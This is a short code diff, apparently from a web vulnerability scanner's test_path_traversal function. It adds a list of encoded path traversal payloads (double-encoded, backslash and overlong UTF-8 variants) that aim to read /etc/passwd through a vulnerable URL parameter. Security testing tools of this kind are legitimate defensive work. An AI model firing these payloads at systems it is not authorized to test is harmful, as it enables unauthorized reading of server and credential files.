@@ -95,6 +95,17 @@ def test_path_traversal(url, cookies=None):
     "../../../../../../../../etc/php5/cli/php.ini",
     "../../../../../../../../etc/php5/cgi/php.ini",
     "../../../../../../../../etc/php5/fpm/php.ini",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
+    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd",
+    "..\..\..\..\..\..\..\..\/etc/passwd",
+    "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd",
+    "%252e%252e\%252e%252e\/etc/passwd..%5c/etc/passwd",
+    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
+    "%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd",
+    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd",
+    "%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd",
+    "..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd"
 ]
 
         num = 0
